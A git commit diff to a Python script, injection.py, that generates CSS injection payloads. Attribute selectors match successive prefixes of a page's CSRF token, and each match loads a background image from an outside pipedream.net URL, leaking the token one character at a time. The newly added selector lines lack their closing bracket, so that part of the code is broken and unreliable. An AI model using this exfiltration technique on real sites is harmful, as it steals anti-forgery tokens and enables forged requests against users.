031dbda1af9750113b547b1e8dff35005364c736
Coutand <bastien.coutand@netcourrier.com>
2022-04-27 17:28:40 +0200

    update css

--- injection.py
+++ injection.py
@@ -97,7 +97,10 @@ def build_css(chars):
         input[name="csrf"][value^="'''+chars+''';"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+''';);}
         input[name="csrf"][value^="'''+chars+'''<"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''<);}
         input[name="csrf"][value^="'''+chars+'''>"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''>);}
-        input[name="csrf"][value^="'''+chars+'''@"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''@);}'''
+        input[name="csrf"][value^="'''+chars+'''@"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''@);}
+        input[name="csrf"][value^="'''+chars+'''["{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''[);}
+        input[name="csrf"][value^="'''+chars+''']"{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+''']);}
+        input[name="csrf"][value^="'''+chars+'''~"{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''~);}'''
         
         file.write(str+"\n\t"+str2) 
         file.close()
